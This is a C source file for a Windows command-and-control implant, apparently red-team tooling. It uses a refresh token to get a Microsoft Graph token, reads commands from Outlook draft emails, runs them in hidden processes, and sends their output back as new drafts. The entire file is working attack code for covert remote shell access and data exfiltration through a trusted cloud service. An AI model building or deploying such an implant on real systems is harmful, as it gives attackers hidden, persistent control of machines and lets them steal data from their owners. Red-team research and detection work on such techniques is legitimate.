// Author: Bobby Cooke (0xBoku/boku/boku7) // SpiderLabs // https://twitter.com/0xBoku // github.com/boku7 // https://www.linkedin.com/in/bobby-cooke/ // https://0xboku.com
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")
#pragma warning(disable : 4996)

#define intZeroMemory(addr,size) memset((addr),0,size)
#define intSpaceMemory(addr,size) memset((addr),0x20,size)
#define BUFSIZE 4096 

typedef struct {
    char* metaCommand;
    char* command;
}metaCommandStruct;

char* getMsGraphAccessToken(char* sitename, char* clientId, char* tenantId, char* refreshToken, char* user_agent, char* response)
{
    HINTERNET hInternet = InternetOpenA(user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        return NULL;
    }
    HINTERNET hConnect = InternetConnectA(hInternet, sitename, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
    if (hConnect == NULL)
    {
        return NULL;
    }
    PCTSTR acceptTypes[] = { "*/*", NULL };
    char method[] = "POST";
    char path[200];
    intZeroMemory(path, sizeof(path));
    sprintf(path, "/%s/oauth2/token?api-version=1.0", tenantId);

    HINTERNET hRequest = HttpOpenRequestA(hConnect, method, path, NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE, 0);
    if (hRequest == NULL)
    {
        return NULL;
    }
    // Use Refresh Token of controlled user to get a short-lived Access Token
    char parameters[2000];
    intZeroMemory(parameters, sizeof(parameters));
    char resource[] = "https%3a%2f%2fgraph.microsoft.com"; // resource 
    char grantType[] = "refresh_token";
    char scope[] = "openid";
    sprintf(parameters, "resource=%s&client_id=%s&grant_type=%s&refresh_token=%s&scope=%s", resource, clientId, grantType, refreshToken, scope);
    int paramSize = strlen(parameters);
    // https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpsendrequesta
    // Send the queued HTTPS Request
    //  BOOL HttpSendRequestA( HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
    BOOL bRequestSent = HttpSendRequestA(hRequest, NULL, 0, parameters, paramSize);
    if (bRequestSent == FALSE)
    {
        return NULL;
    }
    BOOL bKeepReading = TRUE;
    const int nBuffSize = 100000;
    int size = 0;
    DWORD dwBytesRead = -1;
    while (bKeepReading && dwBytesRead != 0) {
        bKeepReading = InternetReadFile(hRequest, response, nBuffSize, &dwBytesRead);
    }
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    // Get the address of the start of the access token string
    char searchAT[] = "access_token";
    char* accessToken = strstr(response, searchAT);
    accessToken += 15;
    // Get the address of the quote that is at the end of the access token string
    char searchRT[] = "refresh_token";
    char* accessTokenEnd = strstr(response, searchRT);
    accessTokenEnd -= 3;
    // Change the quote to a null byte to end the string
    intZeroMemory(accessTokenEnd, 32);
    // return the access token string
    return accessToken;
}

char* getCommandFromDraft(char* accessToken, char* user_agent, char* buff)
{
    char* emailBody = buff;
    HINTERNET hInternet = InternetOpenA(user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        return NULL;
    }
    char sitename[] = "graph.microsoft.com";
    //char sitename[] = "806ppx6zpht9jlzxx49xr26urlxbl0.burpcollaborator.net";
    HINTERNET hConnect = InternetConnectA(hInternet, sitename, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
    if (hConnect == NULL)
    {
        return NULL;
    }
    PCTSTR acceptTypes[] = { "*/*", NULL };
    char method[] = "GET";
    char path[] = "/v1.0/me/MailFolders/drafts/messages?select=body&top=1";

    // Use HTTPS and do not save response to the wininet cache
    HINTERNET hRequest = HttpOpenRequestA(hConnect, method, path, NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE, 0);
    if (hRequest == NULL)
    {
        return NULL;
    }
    // Use MS Graph Access Token to get the most recent email from the inbox
    char headers[4000];
    sprintf(headers, "Authorization: Bearer %s", accessToken);
    int headerSize = strlen(headers);
    BOOL bRequestSent = HttpSendRequestA(hRequest, headers, headerSize, NULL, NULL);
    if (bRequestSent == FALSE)
    {
        return NULL;
    }
    BOOL bKeepReading = TRUE;
    const int nBuffSize = 100000;
    int size = 0;
    DWORD dwBytesRead = -1;
    while (bKeepReading && dwBytesRead != 0) {
        bKeepReading = InternetReadFile(hRequest, emailBody, nBuffSize, &dwBytesRead);
    }
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    char search1[] = "content\":\"";
    char* command = strstr(emailBody, search1);
    if (command < 0x1000) {
        command = NULL;
        return command;
    }
    command += 10;
    char search2[] = "@odata.nextLink";
    char* commandEnd = strstr(emailBody, search2);
    commandEnd -= 6;
    intZeroMemory(commandEnd, 1);
    return command;
}

// Create a Draft Email - Microsoft Graph REST API v1.0
// https://docs.microsoft.com/en-us/graph/api/user-post-messages?view=graph-rest-1.0&tabs=http
/*
POST https ://graph.microsoft.com/v1.0/me/messages
Content - type : application / json
 {"subject":"Did you see last night's game?","importance":"Low","body":{"contentType":"HTML","content":"They were <b>awesome</b>!"},"toRecipients":[
 {"emailAddress":{"address":"AdeleV@contoso.onmicrosoft.com"}}]}
*/
char* createEmailDraft(char* accessToken, char* user_agent, char* egressBuffer, char* ingressBuffer)
{
    HINTERNET hInternet = InternetOpenA(user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        return NULL;
    }
    char sitename[] = "graph.microsoft.com";
    HINTERNET hConnect = InternetConnectA(hInternet, sitename, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
    if (hConnect == NULL)
    {
        return NULL;
    }
    PCTSTR acceptTypes[] = { "*/*", NULL };
    char method[] = "POST";
    char path[] = "/v1.0/me/messages";
    HINTERNET hRequest = HttpOpenRequestA(hConnect, method, path, NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE, 0);
    if (hRequest == NULL)
    {
        return NULL;
    }
    // Use MS Graph Access Token to get the most recent email from the inbox
    char headers[4000];
    sprintf(headers, "Content-type: application/json\r\nAuthorization: Bearer %s", accessToken);
    int headerSize = strlen(headers);
    char parameters[8000];
    intZeroMemory(parameters, sizeof(parameters));
    // Cut off the egress buffer so it doesn't overwrite everything
    intZeroMemory(egressBuffer + 7000, 1);
    //char exfiltrate[] = "egress message";
    sprintf(parameters, "{\"subject\":\"Azure Outlook Command & Control\", \"importance\" : \"High\", \"body\" : {\"contentType\":\"TEXT\", \"content\" : \"%s\"}, \"toRecipients\" : [{\"emailAddress\":{\"address\":\"Bobby.Cooke@0xBoku.com\"}}]}", egressBuffer);
    int paramSize = strlen(parameters);
    // https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpsendrequesta
    // Send the queued HTTPS Request
    //  BOOL HttpSendRequestA( HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
    BOOL bRequestSent = HttpSendRequestA(hRequest, headers, headerSize, parameters, paramSize);
    if (bRequestSent == FALSE)
    {
        return NULL;
    }
    BOOL bKeepReading = TRUE;
    const int nBuffSize = 100000;
    int size = 0;
    DWORD dwBytesRead = -1;
    while (bKeepReading && dwBytesRead != 0) {
        bKeepReading = InternetReadFile(hRequest, ingressBuffer, nBuffSize, &dwBytesRead);
    }
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return ingressBuffer;
}

// https://docs.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output?redirectedfrom=MSDN
// https://stackoverflow.com/questions/42402673/createprocess-and-capture-stdout
HANDLE runCommandAsProcess(char* command)
{
    HANDLE pipeIN, pipeOUT;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES saAttr;
    ZeroMemory(&saAttr, sizeof(saAttr));
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;
    // Create a pipe for the child process's STDOUT. 
    CreatePipe(&pipeOUT, &pipeIN, &saAttr, 0);
    // Ensure the read handle to the pipe for STDOUT is not inherited.
    SetHandleInformation(pipeOUT, HANDLE_FLAG_INHERIT, 0);
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdError = pipeIN;
    si.hStdOutput = pipeIN;
    si.dwFlags |= STARTF_USESTDHANDLES;
    ZeroMemory(&pi, sizeof(pi));
    // Start the child process. 
    CreateProcessA(NULL, (TCHAR*)command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    // Wait until the command runs in the process and the process closes
    //   For commands that take a long time to output this is required or the output will be null
    WaitForSingleObject(pi.hProcess, 20000);
    // Close handles to the child process and its primary thread.
    // Some applications might keep these handles to monitor the status
    // of the child process, for example. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    // Close the write end of the pipe before reading to avoid hanging
    CloseHandle(pipeIN);
    return pipeOUT;
}

void ReadFromPipe(char* egressBuffer, HANDLE pipeOUT)
// Read output from the child process's pipe for STDOUT and write to the parent process's pipe for STDOUT.
{
    DWORD dwRead = 0;
    DWORD dwWritten = 0;
    BOOL bSuccess = FALSE;
    bSuccess = ReadFile(pipeOUT, egressBuffer, 4096, &dwRead, NULL);
    CloseHandle(pipeOUT);
}

void cleanOutput(char* buffer)
{
    char dquote[] = "\"";
    char* replace;
    // Clean up double quotes because it breaks JSON
    while (strstr(buffer, dquote))
    {
        replace = strstr(buffer, dquote);
        // Change the quote to a space byte
        intSpaceMemory(replace, 1);
    }
    // Clean up backslash because it breaks JSON
    char bslash[] = "\\";
    while (strstr(buffer, bslash))
    {
        replace = strstr(buffer, bslash);
        // Change the bslash to a space byte
        intSpaceMemory(replace, 1);
    }
}

void parseMetaCommand(char* command, metaCommandStruct* commandStruct)
{
    // the first word in the command string is the meta command
    commandStruct->metaCommand = command;
    char space[] = " ";
    char* replace = strstr(command, space);
    if (replace)
    {
        commandStruct->command = replace + 1;
        // Change the first space to a null string delimiter
        intZeroMemory(replace, 1);
    }
    return;
}

void main() {
    // Variables
    char refreshToken[] = "REPLACE THIS";
    char tenantId[]     = "REPLACE THIS";
    DWORD napTime       = 20000; // second sleep
    char sitename[]     = "login.microsoftonline.com";
    //char sitename[]   = "h1jmj59wadg8l8taczm6fpzolfr5fu.burpcollaborator.net"; 
    char clientId[]     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"; // Office 365 Client ID
    char user_agent[]   = "Mozilla";
    char* sleepStr      = "sleep";
    char* shellStr      = "cmd";
    char* exitStr       = "exit";
    int isShellStr      = 0;
    int isSleepStr      = 0;
    int isExitStr       = 0;
    HANDLE pipeOUT;
    // Allocate Memory Buffers
    char* accessTokenBuffer = VirtualAlloc(0, 100000, MEM_COMMIT, PAGE_READWRITE);
    char* ingressBuffer     = VirtualAlloc(0, 100000, MEM_COMMIT, PAGE_READWRITE);
    char* egressBuffer      = VirtualAlloc(0, 100000, MEM_COMMIT, PAGE_READWRITE);
    // While Loop Memory Pointers
    char* accessToken;
    char* command;
    char* sendDraftResponse;
    // Get Access Token from Refresh Token
    intZeroMemory(accessTokenBuffer, 100000);
    accessToken = getMsGraphAccessToken(sitename, clientId, tenantId, refreshToken, user_agent, accessTokenBuffer);
    // https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-gettickcount
    // Get a new Access Token every 15 minutes / 900 seconds / 900,000 milliseconds
    DWORD tokenRefreshInterval = 900000; // Change this to modify how frequently this gets a new Access Token
    DWORD AccessTokenTimeStamp = GetTickCount();
    DWORD TimeToGetNewToken    = AccessTokenTimeStamp + tokenRefreshInterval;
    DWORD CurrentTimeStamp     = 0;
    while (1)
    {
        if (accessToken == NULL)
        {
            Sleep(180000);   // If AccessToken is NULL, then the internet connection probably failed. Sleep for 3 minutes and try again.
            intZeroMemory(accessTokenBuffer, 100000);
            accessToken      = getMsGraphAccessToken(sitename, clientId, tenantId, refreshToken, user_agent, accessTokenBuffer);
        }
        // Checks if its time to get a new Access Token. If True, gets new Access Token for C2 comms
        CurrentTimeStamp     = GetTickCount(); // Get the Current time as tickcount and see if its time for a new token
        if (CurrentTimeStamp > TimeToGetNewToken)
        {
            intZeroMemory(accessTokenBuffer, 100000);
            accessToken          = getMsGraphAccessToken(sitename, clientId, tenantId, refreshToken, user_agent, accessTokenBuffer);
            AccessTokenTimeStamp = GetTickCount();
            TimeToGetNewToken    = AccessTokenTimeStamp + tokenRefreshInterval;
        }
        // Clear the input & output buffers to avoid currupted strings from last buffer
        intZeroMemory(ingressBuffer, 100000);
        intZeroMemory(egressBuffer,  100000);
        // Get the command from the most recent draft email
        if (accessToken != NULL)
        {
            command = getCommandFromDraft(accessToken, user_agent, ingressBuffer);
        }
        else
        {
            intZeroMemory(ingressBuffer, 100000);
            command = ingressBuffer;
        }
        // Check if Command is empty/blank. If not then do something
        if (command[0] != 0x00)
        {
            // Get the meta command and command from the parsed draft message
            metaCommandStruct commandStruct;
            parseMetaCommand(command, &commandStruct);
            // Check if the meta command is "sleep"
            isShellStr = strcmp(commandStruct.metaCommand, shellStr);
            if (isShellStr == 0)
            {
                pipeOUT = runCommandAsProcess(commandStruct.command);
                ReadFromPipe(egressBuffer, pipeOUT);
            }
            // MetaCommand handler for Sleep/naptime
            isSleepStr = strcmp(commandStruct.metaCommand, sleepStr);
            if (isSleepStr == 0)
            {
                napTime = (DWORD)atof(commandStruct.command); // String to DWORD 
            }
            // Check if the meta command is "exit"
            isExitStr = strcmp(commandStruct.metaCommand, exitStr);
            if (isExitStr == 0)
            {
                // Create another draft email so it doesnt get stuck if rerunning
                intZeroMemory(ingressBuffer, 100000);
                intZeroMemory(egressBuffer, 100000);
                sendDraftResponse = createEmailDraft(accessToken, user_agent, egressBuffer, ingressBuffer);
                ExitProcess(0); // exits the process if meta command is "exit"
            }
            // Remove  " \ because they will break the JSON 
            cleanOutput(egressBuffer);
            // Send out via Draft Email
            intZeroMemory(ingressBuffer, 100000);
            sendDraftResponse = createEmailDraft(accessToken, user_agent, egressBuffer, ingressBuffer);
            // Create another draft email so drafts are ready for next input and for logging of exfil 
            intZeroMemory(ingressBuffer, 100000);
            intZeroMemory(egressBuffer,  100000);
            if (sendDraftResponse != NULL)
            {
                sendDraftResponse = createEmailDraft(accessToken, user_agent, egressBuffer, ingressBuffer);
            }
        }
        Sleep(napTime);
    }
    return;
}
